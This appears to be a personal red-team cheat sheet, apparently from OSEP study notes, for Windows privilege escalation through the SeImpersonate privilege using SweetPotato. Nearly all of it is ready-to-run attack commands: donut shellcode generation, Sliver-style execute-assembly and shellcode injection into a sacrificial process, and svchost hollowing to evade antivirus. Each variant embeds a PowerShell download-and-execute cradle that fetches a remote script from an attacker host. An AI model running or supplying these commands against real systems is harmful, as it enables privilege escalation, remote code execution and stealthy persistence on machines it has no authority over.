# SeImpersonate Privileges

### 1) We can use donut to get the shell, change IP address

    donut -i /home/kali/tools/bins/csharp-files/SweetPotato.exe -a 2 -b 2 -p "-p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a \"IEX((new-object net.webclient).downloadstring('http://10.10.10.11/hav0c-ps.txt'))\"" -o /home/kali/tools/bins/csharp-files/SweetPotato.bin

### 2) Using EfsRpc

    donut -i /home/kali/tools/bins/csharp-files/SweetPotato.exe -a 2 -b 2 -p "-e EfsRpc -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a \"IEX((new-object net.webclient).downloadstring('http://10.10.10.11/hav0c-ps.txt'))\"" -o /home/kali/tools/bins/csharp-files/SweetPotato.bin

### 3) Run directly using exec-assembly

    execute-assembly /home/kali/tools/bins/csharp-files/SweetPotato.exe -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"-ep bypass -nop iex (New-Object System.Net.WebClient).DownloadString(\'http://10.10.10.11/hav0c-ps.txt\')\"
    execute-assembly /home/kali/tools/bins/csharp-files/SweetPotato.exe -e EfsRpc -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"-ep bypass -nop iex (New-Object System.Net.WebClient).DownloadString(\'http://10.10.10.11/hav0c-ps.txt\')\"

### 4) Run a sacrificial process

    execute notepad
    ps -e notepad

### 5) Inject into the process - RECOMMENDED

    execute-shellcode -S -r -I 30 -p 2060 /home/kali/tools/bins/csharp-files/SweetPotato.bin

### 6) We can run this and get another shell

    execute-shellcode -i -S -r -I 30 /home/kali/tools/bins/csharp-files/SweetPotato.bin
    execute-shellcode -S -r -I 30 /home/kali/tools/bins/csharp-files/SweetPotato.bin

### 7) Once we get the shell, make sure to do implant duplication using phollow as this one will get killed by AV sooner or later

    hollow svchost.exe /home/kali/OSEP/hav0c/sliver.x64.bin
